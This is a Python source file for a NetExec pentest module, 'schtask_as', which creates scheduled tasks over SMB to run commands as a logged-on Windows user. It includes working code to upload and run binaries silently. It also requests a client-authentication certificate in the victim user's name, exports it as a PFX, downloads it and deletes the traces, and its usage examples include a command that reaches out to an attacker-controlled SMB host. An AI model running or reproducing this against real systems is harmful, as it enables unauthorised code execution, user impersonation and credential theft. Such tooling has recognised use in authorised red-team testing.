import os
from time import sleep
from io import BytesIO
from textwrap import dedent
from nxc.paths import TMP_PATH
from traceback import format_exc
from nxc.helpers.misc import CATEGORY
from nxc.helpers.misc import gen_random_string
from nxc.protocols.smb.atexec import TSCH_EXEC


class NXCModule:
    """
    Execute a scheduled task remotely as a already connected user by @Defte_
    Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
    Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
    Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
    Modified by @SGMG11 to execute the task without output
    Modified by @Defte_ to add certificate request on behalf of someone options
    """
    name = "schtask_as"
    description = "Remotely execute a scheduled task as a logged on user"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def options(self, context, module_options):
        r"""
        CMD            Command to execute
        USER           User to execute command as
        BINARY         OPTIONAL: Upload the binary to be executed by CMD
        TASK           OPTIONAL: Set a name for the scheduled task name
        FILE           OPTIONAL: Set a name for the command output file
        LOCATION       OPTIONAL: Set a location for the command output file (e.g. 'C:\\Windows\\Temp\\')
        SILENTCOMMAND  OPTIONAL: Do not retrieve output
        CA             OPTIONAL: Set the Certificate Authority name to ask the certificate from (i.e: SERVER\CA_NAME)
        TEMPLATE       OPTIONAL: Set the name of the template to request a certificate from

        Example:
        -------
        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=whoami
        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='bin.exe --option' BINARY=bin.exe
        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='dir \\<attacker-ip>\pwn' TASK='Legit Task' SILENTCOMMAND='True'
        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=certreq CA='ADCS\whiteflag-ADCS-CA' TEMPLATE=User
        """
        self.command_to_run = self.binary_to_upload = self.run_task_as = self.task_name = self.output_filename = self.output_file_location = self.time = self.ca_name = self.template_name = None
        self.share = "C$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_path = self.tmp_dir.split(":")[1]
        self.show_output = True

        if "CMD" in module_options:
            self.command_to_run = module_options["CMD"]

        if "BINARY" in module_options:
            self.binary_to_upload = module_options["BINARY"]

        if "USER" in module_options:
            self.run_task_as = module_options["USER"]

        if "TASK" in module_options:
            self.task_name = module_options["TASK"]

        if "FILE" in module_options:
            self.output_filename = module_options["FILE"]

        if "LOCATION" in module_options:
            # Ensure trailing backslashes
            self.output_file_location = module_options["LOCATION"].rstrip("\\") + "\\"

        if "SILENTCOMMAND" in module_options and module_options["SILENTCOMMAND"] in ["True", "yes", "1"]:
            self.show_output = False

        if "CA" in module_options:
            self.ca_name = module_options["CA"]

        if "TEMPLATE" in module_options:
            self.template_name = module_options["TEMPLATE"]

    def on_admin_login(self, context, connection):
        self.logger = context.log

        if self.command_to_run is None:
            self.logger.fail("You need to specify a CMD to run")
            return

        if self.command_to_run.lower() == "certreq":
            if self.ca_name is None:
                self.logger.fail("CertReq requires the CA name in the following format: SERVER_NAME\\CertificateAuthority_Name")
                return

            if self.template_name is None:
                self.logger.fail("CertReq requires the template to request a certificate from")
                return

            tmp_share = self.share.replace("$", ":")
            random_file_prefix = gen_random_string(10)

            batch_file = BytesIO(dedent(f"""
            @echo off
            setlocal enabledelayedexpansion

            certreq -new {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.inf {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.req > nul
            certreq -submit -config {self.ca_name} {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.req {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.cer > nul

            set "HASH="

            for /f "usebackq tokens=* delims=" %%L in (`certreq -accept {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.cer`) do (
                set "line=%%L"

                for /f "tokens=2* delims=:" %%X in ("!line!") do (
                    set "candidate=%%X"
                    set "candidate=!candidate:~1!"
                    echo !candidate! | findstr /R "^[0-9A-Fa-f][0-9A-Fa-f]*" > nul
                    if not errorlevel 1 (
                        if "!candidate:~40!"=="" (
                            set "HASH=!candidate!"
                            certutil -user -exportPFX -p "" !HASH! {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.pfx > nul
                        )
                    )
                )
            )
            """).encode())
            connection.conn.putFile(self.share, f"{self.tmp_path}\\{random_file_prefix}.bat", batch_file.read)
            self.logger.success("Upload batch file successfully")

            inf_file = BytesIO(dedent(f"""
            [Version]
            Signature="$Windows NT$"

            [NewRequest]
            Subject = "CN={self.run_task_as}"
            KeySpec = 1
            KeyLength = 2048
            Exportable = TRUE
            MachineKeySet = FALSE
            SMIME = FALSE
            PrivateKeyArchive = FALSE
            UserProtected = FALSE
            UseExistingKeySet = FALSE
            ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
            ProviderType = 12
            RequestType = PKCS10
            KeyUsage = 0xa0

            [EnhancedKeyUsageExtension]
            OID=1.3.6.1.5.5.7.3.2

            [RequestAttributes]
            CertificateTemplate = {self.template_name}
            """).encode())
            connection.conn.putFile(self.share, f"{self.tmp_path}\\{random_file_prefix}.inf", inf_file.read)
            self.logger.success("Upload INF file successfully")

            self.command_to_run = f"{tmp_share}\\{self.tmp_path}\\{random_file_prefix}.bat"

        if self.run_task_as is None:
            self.logger.fail("You need to specify a USER to run the command as")
            return

        if self.show_output is False:
            self.logger.display("Command will be executed silently without output")

        if self.binary_to_upload:
            if not os.path.isfile(self.binary_to_upload):
                self.logger.fail(f"Cannot find {self.binary_to_upload}")
                return
            else:
                self.logger.display(f"Uploading {self.binary_to_upload}")
                binary_file_location = self.tmp_path if self.output_file_location is None else self.output_file_location
                with open(self.binary_to_upload, "rb") as binary_to_upload:
                    try:
                        self.binary_to_upload_name = os.path.basename(self.binary_to_upload)
                        connection.conn.putFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}", binary_to_upload.read)
                        self.logger.success(f"Binary {self.binary_to_upload_name} successfully uploaded in {binary_file_location}{self.binary_to_upload_name}")
                    except Exception as e:
                        self.logger.fail(f"Error writing file to share {binary_file_location}: {e}")
                        return

        self.logger.display("Connecting to the remote Service control endpoint")
        try:
            exec_method = TSCH_EXEC(
                connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                connection.smb_share_name,
                connection.username,
                connection.password,
                connection.domain,
                connection.kerberos,
                connection.aesKey,
                connection.host,
                connection.kdcHost,
                connection.hash,
                self.logger,
                connection.args.get_output_tries,
                connection.args.share,
                self.run_task_as,
                self.command_to_run,
                self.output_filename,
                self.task_name,
                self.output_file_location,
            )

            self.logger.display(f"Executing '{self.command_to_run}' as '{self.run_task_as}'")
            output = exec_method.execute(self.command_to_run, self.show_output)

            try:
                if not isinstance(output, str):
                    output = output.decode(connection.args.codec)
            except UnicodeDecodeError:
                # Required to decode specific French characters otherwise it'll print b"<result>"
                output = output.decode("cp437")
            if output:
                for line in output.splitlines():
                    self.logger.highlight(line.rstrip())

        except Exception:
            self.logger.debug("Error executing command via atexec, traceback:")
            self.logger.debug(format_exc())
        finally:
            if self.binary_to_upload:
                try:
                    connection.conn.deleteFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}")
                    context.log.success(f"Binary {binary_file_location}{self.binary_to_upload_name} successfully deleted")
                except Exception as e:
                    context.log.fail(f"Error deleting {binary_file_location}{self.binary_to_upload_name} on {self.share}: {e}")

            if self.ca_name and self.template_name:
                # Just waiting a bit for the pfx file to be correctly dumped
                sleep(2)
                with open(os.path.join(TMP_PATH, f"{self.run_task_as}.pfx"), "wb+") as dump_file:
                    try:
                        connection.conn.getFile(self.share, f"{self.tmp_path}\\{random_file_prefix}.pfx", dump_file.write)
                        context.log.success(f"PFX file stored in {TMP_PATH}/{self.run_task_as}.pfx")
                    except Exception as e:
                        context.log.fail(f"Error while get {self.tmp_path}\\{random_file_prefix}.pfx: {e}")

                for ext in [".bat", ".inf", ".cer", ".pfx", ".req", ".rsp"]:
                    try:
                        connection.conn.deleteFile(self.share, f"{self.tmp_path}\\{random_file_prefix}{ext}")
                        context.log.success(f"Successfully deleted {self.tmp_path}\\{random_file_prefix}{ext}")
                    except Exception as e:
                        context.log.fail(f"Couldn't delete {self.tmp_path}\\{random_file_prefix}{ext} : {e}")
